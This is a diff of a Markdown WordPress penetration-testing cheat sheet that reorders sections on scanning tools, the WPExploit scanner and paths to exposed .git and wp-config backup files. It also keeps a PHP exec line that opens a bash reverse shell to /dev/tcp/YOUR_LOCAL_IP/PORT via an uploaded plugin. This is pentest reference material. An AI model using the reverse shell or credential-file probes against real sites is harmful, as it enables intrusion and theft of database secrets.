@@ -1,4 +1,15 @@
-## WordPress Pentest
+## WordPress Pentesting
+
+---
+
+### Useful tools
+
+- `wpscan` – CLI scanner for WP vulnerabilities
+- `wpxploit` – Fingerprinting & vuln scan
+- `whatweb` – Web technology detection
+- `wappalyzer` – Web technology detection
+- `nmap` – WP scripts + version detection
+- `builtwith` – Online tech stack detector
 
 ---
 
@@ -111,9 +122,51 @@ wpscan --url https://target.com --api-token YOUR_TOKEN
 
 ---
 
+### WPExploit
+
+- Automated WordPress fingerprinting & vulnerability scanner.
+
+```bash
+wpxploit -u https://target.com
+```
+
+- Fingerprints WordPress version, plugins, and themes.
+- Parses plugin/theme names from HTML source and known paths.
+- Searches for exploits from:
+  - Exploit-DB
+  - WPScan Vulnerability Database
+(*) It depends on the same fingerprint used by WPScan.
+
+#### Theme/Plugin with Known RCE
+- After detecting plugins via `wpscan` or `wpxploit`, search Exploit-DB or use Metasploit modules.
+
+---
+
 ### Register enabled
 - Check this URL and try to register
 `http://example.com/wp-login.php?action=register`
+
+---
+
+#### Check `.git` and Backup Files
+```bash
+https://target.com/.git/
+https://target.com/wp-config.php.swp
+https://target.com/wp-config.inc
+https://target.com/wp-config.old
+https://target.com/wp-config.txt
+https://target.com/wp-config.html
+https://target.com/wp-config.php.bak
+https://target.com/wp-config.php.dist
+https://target.com/wp-config.php.inc
+https://target.com/wp-config.php.old
+https://target.com/wp-config.php.save
+https://target.com/wp-config.php.swp
+https://target.com/wp-config.php.txt
+https://target.com/wp-config.php.zip
+https://target.com/wp-config.php.html
+https://target.com/wp-config.php~
+```
 
 ---
 
@@ -373,57 +426,3 @@ exec("/bin/bash -c 'bash -i >& /dev/tcp/YOUR_LOCAL_IP/PORT 0>&1'");
 
 - Upload as plugin and activate.
 - Ref: `https://www.hackingarticles.in/wordpress-reverse-shell`
-
----
-
-### WPExploit
-
-- Automated WordPress fingerprinting & vulnerability scanner.
-
-```bash
-wpxploit -u https://target.com
-```
-
-- Fingerprints WordPress version, plugins, and themes.
-- Parses plugin/theme names from HTML source and known paths.
-- Searches for exploits from:
-  - Exploit-DB
-  - WPScan Vulnerability Database
-(*) It depends on the same fingerprint used by WPScan.
-
-#### Theme/Plugin with Known RCE
-- After detecting plugins via `wpscan` or `wpxploit`, search Exploit-DB or use Metasploit modules.
-
----
-
-#### Check `.git` and Backup Files
-```bash
-https://target.com/.git/
-https://target.com/wp-config.php.swp
-https://target.com/wp-config.inc
-https://target.com/wp-config.old
-https://target.com/wp-config.txt
-https://target.com/wp-config.html
-https://target.com/wp-config.php.bak
-https://target.com/wp-config.php.dist
-https://target.com/wp-config.php.inc
-https://target.com/wp-config.php.old
-https://target.com/wp-config.php.save
-https://target.com/wp-config.php.swp
-https://target.com/wp-config.php.txt
-https://target.com/wp-config.php.zip
-https://target.com/wp-config.php.html
-https://target.com/wp-config.php~
-```
-
----
-
-### Useful Tools
-
-- `wpscan` – CLI scanner for WP vulnerabilities
-- `wpxploit` – Fingerprinting & vuln scan
-- `whatweb` – Web technology detection
-- `wappalyzer` – Web technology detection
-- `nmap` – WP scripts + version detection
-- `builtwith` – Online tech stack detector
-
